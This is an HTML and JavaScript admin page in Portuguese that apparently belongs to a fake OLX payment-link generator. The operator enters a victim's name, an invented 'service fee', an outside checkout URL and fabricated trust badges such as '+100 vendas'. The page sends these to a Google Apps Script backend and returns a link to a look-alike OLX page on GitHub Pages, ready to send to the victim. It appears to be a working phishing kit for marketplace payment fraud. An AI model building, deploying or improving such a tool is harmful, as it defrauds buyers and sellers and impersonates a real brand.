<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin - Gerador de Links OLX</title>
<style>
  /* --- ESTILOS (Visual Dark Mode) --- */
  body { background:#1e1e1e; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px; margin:0; }
  
  form { 
    max-width:500px; margin:0 auto; background:#2b2b2b; padding:30px; 
    border-radius:12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  }
  
  h2 { text-align:center; color:#00bfa5; margin-top:0; }
  
  label { 
    display:block; font-size: 12px; color: #ccc; 
    text-transform: uppercase; font-weight: bold; margin-top: 15px; 
  }
  
  input { 
    width:100%; padding:12px; margin-top:5px; background:#3a3a3a; 
    border:1px solid #444; color:#fff; border-radius:6px; box-sizing: border-box; 
    font-size: 15px; transition: 0.3s;
  }
  input:focus { border-color: #00bfa5; outline: none; background: #444; }
  
  button#btnSalvar { 
    width:100%; padding:15px; background:#00bfa5; border:none; 
    border-radius:8px; color:#fff; font-weight:bold; cursor:pointer; 
    font-size: 16px; margin-top: 25px; transition: 0.2s;
  }
  button#btnSalvar:hover { background:#009e8e; transform: translateY(-2px); }
  button:disabled { background: #555; cursor: not-allowed; opacity: 0.7; }
  
  /* --- MODAL (Pop-up) --- */
  .modal { 
    display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
    background:rgba(0,0,0,0.9); align-items:center; justify-content:center; z-index: 1000;
  }
  .modal.active { display:flex; animation: fadeIn 0.3s; }
  
  .modal-box { 
    background:#222; padding:30px; border-radius:10px; text-align:center; 
    max-width:450px; width: 90%; border: 1px solid #444; box-shadow: 0 0 50px rgba(0,191,165,0.2);
  }
  
  .link-display { 
    background:#111; padding:15px; color:#00bfa5; word-break:break-all; 
    margin:20px 0; border-radius:5px; font-family: monospace; border: 1px dashed #333;
  }
  
  .btn-action { 
    padding:12px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; width: 100%; margin-bottom: 10px;
  }
  .btn-copy { background:#fff; color:#000; }
  .btn-new { background:transparent; color:#888; border: 1px solid #444; }
  .btn-new:hover { color: #fff; border-color: #fff; }

  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
</style>
</head>
<body>

<form id="adminForm">
  <h2>Novo Pedido</h2>
  
  <label>Valor Total (Ex: R$ 1.200,00)</label>
  <input type="text" name="valor" required placeholder="Digite o valor final">

  <label>Nome do Comprador</label>
  <input type="text" name="comprador" required placeholder="Nome completo">

  <label>Taxa de Serviço (Ex: R$ 50,00)</label>
  <input type="text" name="taxa" placeholder="Valor da taxa">

  <label>Link Pagamento (Checkout)</label>
  <input type="text" name="linkPagamento" placeholder="https://seuchekout.com...">

  <label>Frete (Opcional)</label>
  <input type="text" name="frete" placeholder="Ex: Grátis">

  <label>Tarifa (Opcional)</label>
  <input type="text" name="tarifa" placeholder="Ex: Inclusa">

  <label>CPF (Opcional)</label>
  <input type="text" name="cpf">

  <div style="display:flex; gap:10px;">
    <div style="flex:1">
      <label>Vendas</label>
      <input type="text" name="vendas" value="+100 vendas">
    </div>
    <div style="flex:1">
      <label>Atendimento</label>
      <input type="text" name="atendimento" value="Rápido">
    </div>
  </div>

  <button type="submit" id="btnSalvar">Gerar Link do Cliente</button>
</form>

<div class="modal" id="modalSuccess">
  <div class="modal-box">
    <h3 style="color:#00bfa5; margin-top:0;">Link Gerado com Sucesso!</h3>
    <p style="color:#aaa; font-size:14px;">Envie este link para o cliente acessar os dados.</p>
    
    <div class="link-display" id="finalLink">...</div>
    
    <button class="btn-action btn-copy" id="btnCopy">Copiar Link</button>
    <button class="btn-action btn-new" onclick="location.reload()">Criar Novo Pedido</button>
  </div>
</div>

<script>
// ========================================================
// ⚙️ CONFIGURAÇÃO OBRIGATÓRIA
// ========================================================

// 1. Cole aqui a URL do seu Google Script (Implantar > Web App)
const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 

// 2. Cole aqui a URL do seu site GitHub Pages (Tela do Cliente)
const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 

// ========================================================

const form = document.getElementById('adminForm');
const modal = document.getElementById('modalSuccess');
const linkDisplay = document.getElementById('finalLink');
const btnSalvar = document.getElementById('btnSalvar');
const btnCopy = document.getElementById('btnCopy');

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  // Bloqueia botão
  btnSalvar.textContent = "Processando...";
  btnSalvar.disabled = true;

  // Coleta dados do form
  const data = {};
  new FormData(form).forEach((v, k) => data[k] = v);

  try {
    // TÉCNICA ANTI-CORS: text/plain + redirect:follow
    const res = await fetch(BACKEND_URL, {
      method: 'POST',
      redirect: 'follow', 
      headers: {
        'Content-Type': 'text/plain;charset=utf-8', 
      },
      body: JSON.stringify(data)
    });
    
    const json = await res.json();

    if (json.status === 'success') {
      // Monta o link final: URL do Site + ?id= + ID gerado pelo Google
      const linkPronto = `${CLIENTE_URL}?id=${json.id}`;
      
      // Exibe Modal
      linkDisplay.textContent = linkPronto;
      modal.classList.add('active');
    } else {
      alert('Erro do Servidor: ' + json.message);
    }

  } catch (err) {
    console.error(err);
    alert('❌ ERRO DE PERMISSÃO OU CONEXÃO!\n\nVerifique:\n1. Se você implantou o Script como "Qualquer pessoa" (Anyone).\n2. Se a URL do Script está correta.');
  } finally {
    // Libera botão
    btnSalvar.textContent = "Gerar Link do Cliente";
    btnSalvar.disabled = false;
  }
});

// Botão Copiar
btnCopy.addEventListener('click', () => {
  navigator.clipboard.writeText(linkDisplay.textContent);
  const original = btnCopy.textContent;
  btnCopy.textContent = "Copiado!";
  btnCopy.style.background = "#4CAF50";
  setTimeout(() => {
    btnCopy.textContent = original;
    btnCopy.style.background = "#fff";
  }, 2000);
});
</script>

</body>
</html>
